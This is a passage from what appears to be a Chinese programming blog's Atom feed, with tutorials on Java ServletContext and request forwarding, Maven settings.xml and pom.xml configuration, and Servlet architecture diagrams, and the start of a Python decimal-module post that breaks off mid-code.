servletContext.getAttributeNames();</span><br></pre></td></tr></table></figure></div><h3 id="3-3-资源访问"><a href="#3-3-资源访问" class="headerlink" title="3.3 资源访问"></a>3.3 资源访问</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取资源文件的真实路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> servletContext.getRealPath(<span class="string">&quot;/WEB-INF/config.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取资源文件的URL</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> servletContext.getResource(<span class="string">&quot;/WEB-INF/config.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取资源流</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> servletContext.getResourceAsStream(<span class="string">&quot;/WEB-INF/config.properties&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定路径下的所有资源</span></span><br><span class="line">Set&lt;String&gt; paths = servletContext.getResourcePaths(<span class="string">&quot;/WEB-INF/&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="3-4-日志记录"><a href="#3-4-日志记录" class="headerlink" title="3.4 日志记录"></a>3.4 日志记录</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">servletContext.log(<span class="string">&quot;用户登录成功&quot;</span>);</span><br><span class="line">servletContext.log(<span class="string">&quot;数据库连接失败&quot;</span>, <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Connection refused&quot;</span>));</span><br></pre></td></tr></table></figure></div><h3 id="3-5-请求转发"><a href="#3-5-请求转发" class="headerlink" title="3.5 请求转发"></a>3.5 请求转发</h3><p>ServletContext 提供了请求转发的功能，可以将请求转发到其他 Servlet、JSP 或者静态资源。</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 RequestDispatcher</span></span><br><span class="line"><span class="type">RequestDispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> servletContext.getRequestDispatcher(<span class="string">&quot;/target&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转发请求</span></span><br><span class="line">dispatcher.forward(request, response);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含其他资源的内容</span></span><br><span class="line">dispatcher.include(request, response);</span><br></pre></td></tr></table></figure></div><p>实际使用示例：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/source&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SourceServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 设置请求属性</span></span><br><span class="line">        request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Hello from SourceServlet&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取 RequestDispatcher</span></span><br><span class="line">        <span class="type">RequestDispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> getServletContext()</span><br><span class="line">            .getRequestDispatcher(<span class="string">&quot;/target&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 转发请求</span></span><br><span class="line">        dispatcher.forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/target&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TargetServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 获取转发的属性</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) request.getAttribute(<span class="string">&quot;message&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h2&gt;Target Servlet&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;p&gt;转发消息: &quot;</span> + message + <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>请求转发的特点：</p><ol><li>URL 不会改变，客户端感知不到转发的发生</li><li>只能转发到同一个 Web 应用中的资源</li><li>请求属性会被保留并传递给目标资源</li><li>可以使用相对路径或绝对路径（以”&#x2F;“开头）</li></ol><p>注意事项：</p><ol><li>forward() 方法调用后，原始的响应内容会被清空</li><li>在调用 forward() 之前不要提交响应</li><li>include() 方法可以将目标资源的输出添加到当前响应中</li><li>避免循环转发导致死循环</li></ol><h2 id="4-最佳实践建议"><a href="#4-最佳实践建议" class="headerlink" title="4. 最佳实践建议"></a>4. 最佳实践建议</h2><ol><li><p><strong>属性管理</strong>：</p><ul><li>只存储应用程序级别的数据</li><li>避免存储过大的对象</li><li>及时清理不再使用的属性</li></ul></li><li><p><strong>资源访问</strong>：</p><ul><li>使用相对路径访问资源</li><li>注意资源流的关闭</li><li>缓存频繁访问的资源路径</li></ul></li><li><p><strong>日志使用</strong>：</p><ul><li>记录重要的应用程序事件</li><li>包含足够的上下文信息</li><li>适当使用异常堆栈信息</li></ul></li><li><p><strong>性能考虑</strong>：</p><ul><li>避免频繁读写ServletContext属性</li><li>合理使用初始化参数</li><li>注意线程安全问题</li></ul></li></ol><h2 id="5-注意事项"><a href="#5-注意事项" class="headerlink" title="5. 注意事项"></a>5. 注意事项</h2><ol><li>ServletContext是线程不安全的，在并发访问时需要注意同步问题</li><li>避免在ServletContext中存储用户级别的数据</li><li>初始化参数在应用启动后不可修改</li><li>资源路径要使用Web应用程序根目录作为基准</li><li>及时释放通过ServletContext获取的资源</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Maven配置详解</title>
    <link href="http://example.com/2025/03/31/java/maven/maven%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2025/03/31/java/maven/maven%E9%85%8D%E7%BD%AE/</id>
    <published>2025-03-31T21:33:21.000Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Maven配置详解"><a href="#Maven配置详解" class="headerlink" title="Maven配置详解"></a>Maven配置详解</h1><h2 id="1-settings-xml-配置"><a href="#1-settings-xml-配置" class="headerlink" title="1. settings.xml 配置"></a>1. settings.xml 配置</h2><p>Maven的配置文件主要是 settings.xml，通常有两个位置：</p><ul><li>全局配置：<code>$&#123;maven.home&#125;/conf/settings.xml</code></li><li>用户配置：<code>$&#123;user.home&#125;/.m2/settings.xml</code></li></ul><h3 id="1-1-基本配置项"><a href="#1-1-基本配置项" class="headerlink" title="1.1 基本配置项"></a>1.1 基本配置项</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 本地仓库路径配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>D:/maven/repository<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 镜像配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 代理配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">proxies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>optional<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">active</span>&gt;</span>true<span class="tag">&lt;/<span class="name">active</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">protocol</span>&gt;</span>http<span class="tag">&lt;/<span class="name">protocol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">host</span>&gt;</span>proxy.somewhere.com<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">port</span>&gt;</span>8080<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">proxies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="2-pom-xml-配置"><a href="#2-pom-xml-配置" class="headerlink" title="2. pom.xml 配置"></a>2. pom.xml 配置</h2><h3 id="2-1-基础配置"><a href="#2-1-基础配置" class="headerlink" title="2.1 基础配置"></a>2.1 基础配置</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 项目坐标 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 项目依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="2-2-属性配置"><a href="#2-2-属性配置" class="headerlink" title="2.2 属性配置"></a>2.2 属性配置</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>5.3.9<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="3-常用Maven命令"><a href="#3-常用Maven命令" class="headerlink" title="3. 常用Maven命令"></a>3. 常用Maven命令</h2><ul><li><code>mvn clean</code>: 清理项目</li><li><code>mvn compile</code>: 编译项目</li><li><code>mvn test</code>: 运行测试</li><li><code>mvn package</code>: 打包项目</li><li><code>mvn install</code>: 安装到本地仓库</li><li><code>mvn deploy</code>: 部署到远程仓库</li></ul><h2 id="4-生命周期"><a href="#4-生命周期" class="headerlink" title="4. 生命周期"></a>4. 生命周期</h2><p>Maven的生命周期分为三个标准周期：</p><ol><li>clean: 清理项目</li><li>default: 构建项目</li><li>site: 生成项目站点</li></ol><h2 id="5-仓库配置"><a href="#5-仓库配置" class="headerlink" title="5. 仓库配置"></a>5. 仓库配置</h2><h3 id="5-1-仓库类型"><a href="#5-1-仓库类型" class="headerlink" title="5.1 仓库类型"></a>5.1 仓库类型</h3><ul><li>本地仓库</li><li>远程仓库<ul><li>中央仓库</li><li>私服</li><li>其他公共仓库</li></ul></li></ul><h3 id="5-2-私服配置示例"><a href="#5-2-私服配置示例" class="headerlink" title="5.2 私服配置示例"></a>5.2 私服配置示例</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus Repository<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://nexus.example.com/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="6-插件配置"><a href="#6-插件配置" class="headerlink" title="6. 插件配置"></a>6. 插件配置</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">source</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span>&gt;</span>$&#123;java.version&#125;<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="maven" scheme="http://example.com/tags/maven/"/>
    
    <category term="构建工具" scheme="http://example.com/tags/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Servlet实现原理</title>
    <link href="http://example.com/2025/03/31/java/servlet/servlet/"/>
    <id>http://example.com/2025/03/31/java/servlet/servlet/</id>
    <published>2025-03-31T20:21:01.000Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Servlet生命周期"><a href="#1-Servlet生命周期" class="headerlink" title="1. Servlet生命周期"></a>1. Servlet生命周期</h2><pre class="mermaid">graph TB    A[服务器启动] --> B{是否配置load-on-startup?}    B -->|是| C[初始化Servlet]    B -->|否| D[等待首次请求]    D --> C    C --> E[执行init方法]    E --> F[等待请求]    F --> G[执行service方法]    G --> F    H[服务器关闭] --> I[执行destroy方法]</pre><h2 id="2-请求处理流程"><a href="#2-请求处理流程" class="headerlink" title="2. 请求处理流程"></a>2. 请求处理流程</h2><pre class="mermaid">sequenceDiagram    participant Client as 客户端    participant Server as Web服务器    participant Container as Servlet容器    participant Servlet as Servlet实例    Client->>Server: HTTP请求    Server->>Container: 转发请求    Container->>Container: 创建Request对象    Container->>Container: 创建Response对象    Container->>Servlet: 调用service()    Servlet->>Servlet: 根据请求方法调用do*()    Servlet-->>Container: 返回处理结果    Container-->>Server: 处理响应    Server-->>Client: HTTP响应</pre><h2 id="3-Servlet容器架构"><a href="#3-Servlet容器架构" class="headerlink" title="3. Servlet容器架构"></a>3. Servlet容器架构</h2><pre class="mermaid">graph LR    A[Web容器] --> B[生命周期管理]    A --> C[请求处理]    A --> D[多线程管理]    A --> E[安全控制]        B --> B1[初始化]    B --> B2[服务]    B --> B3[销毁]        C --> C1[请求分发]    C --> C2[响应处理]</pre><h2 id="4-过滤器链执行流程"><a href="#4-过滤器链执行流程" class="headerlink" title="4. 过滤器链执行流程"></a>4. 过滤器链执行流程</h2><pre class="mermaid">graph LR    A[请求] --> B[Filter1]    B --> C[Filter2]    C --> D[Filter3]    D --> E[Servlet]    E --> F[Filter3]    F --> G[Filter2]    G --> H[Filter1]    H --> I[响应]</pre><h2 id="5-核心组件关系"><a href="#5-核心组件关系" class="headerlink" title="5. 核心组件关系"></a>5. 核心组件关系</h2><pre class="mermaid">classDiagram    class ServletContext {        +getInitParameter()        +getAttribute()        +setAttribute()    }    class ServletConfig {        +getServletName()        +getInitParameter()    }    class HttpServlet {        +init()        +service()        +destroy()    }    class HttpServletRequest {        +getParameter()        +getSession()        +getAttribute()    }    class HttpServletResponse {        +setContentType()        +getWriter()        +sendRedirect()    }        ServletConfig --> ServletContext    HttpServlet --> ServletConfig    HttpServlet --> HttpServletRequest    HttpServlet --> HttpServletResponse</pre><h2 id="6-请求分发过程"><a href="#6-请求分发过程" class="headerlink" title="6. 请求分发过程"></a>6. 请求分发过程</h2><pre class="mermaid">stateDiagram-v2    [*] --> 接收请求    接收请求 --> URL映射    URL映射 --> 创建请求响应对象    创建请求响应对象 --> 调用Servlet    调用Servlet --> 处理请求    处理请求 --> 生成响应    生成响应 --> [*]</pre><h2 id="7-关键代码示例"><a href="#7-关键代码示例" class="headerlink" title="7. 关键代码示例"></a>7. 关键代码示例</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="built_in">super</span>.init(config);</span><br><span class="line">        <span class="comment">// 初始化代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理GET请求</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;Servlet示例&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 清理资源</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="8-web-xml配置示例"><a href="#8-web-xml配置示例" class="headerlink" title="8. web.xml配置示例"></a>8. web.xml配置示例</h2><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>exampleServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.ExampleServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>exampleServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/example/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>以上流程图清晰地展示了Servlet的实现原理，包括生命周期、请求处理流程、容器架构、过滤器链等关键概念。使用图表可以更直观地理解Servlet的工作方式.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>py decimal库</title>
    <link href="http://example.com/2025/03/30/python/py-decimal/"/>
    <id>http://example.com/2025/03/30/python/py-decimal/</id>
    <published>2025-03-30T16:45:50.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="decimal-库简介"><a href="#decimal-库简介" class="headerlink" title="decimal 库简介"></a>decimal 库简介</h2><p>decimal 是 Python 标准库中用于十进制浮点运算的模块，它提供了 Decimal 类来进行精确的十进制数学计算。与内置的 float 类型相比，Decimal 可以：</p><ul><li>精确控制精度</li><li>正确处理小数计算</li><li>消除浮点数计算中的精度误差</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="1-创建-Decimal-对象"><a href="#1-创建-Decimal-对象" class="headerlink" title="1. 创建 Decimal 对象"></a>1. 创建 Decimal 对象</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本创建方式</span></span><br><span class="line">d1 = Decimal(<span class="string">&#x27;0.1&#x27;</span>)</span><br><span class="line">d2 = Decimal(<span class="string">&#x27;0.2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d1 + d2 = <span class="subst">&#123;d1 + d2&#125;</span>&quot;</span>)  <span class="comment"># 输出：0.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对比 float</span></span><br><span class="line">f1 = <span class="number">0.1</span></span><br><span class="line">f2 = <span class="number">0.2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f1 + f2 = <span class="subst">&#123;f1 + f2&#125;</span>&quot;</span>)  <span class="comment"># 输出：0.30000000000000004</span></span><br></pre></td></tr></table></figure></div><h3 id="2-精度控制"><a href="#2-精度控制" class="headerlink" title="2. 精度控制"></a>2. 精度控制</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置全局精度</span></span><br><span class="line">getcontext().prec = <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># 输出：0.3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时改变精度</span></span><br><span class="line"><span class="keyword">with</span> localcontext() <span class="keyword">as</span> ctx:</span><br><span class="line">    ctx.prec = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># 输出：0.33</span></span><br></pre></td></tr></table></figure></div><h3 id="3-四舍五入"><a href="#3-四舍五入" class="headerlink" title="3. 四舍五入"></a>3. 四舍五入</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, ROUND_HALF_UP, ROUND_DOWN</span><br><span class="line"></span><br><span class="line">num = Decimal(<span class="string">&#x27;3.14159&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四舍五入到指定位数</span></span><br><span class="line"><span 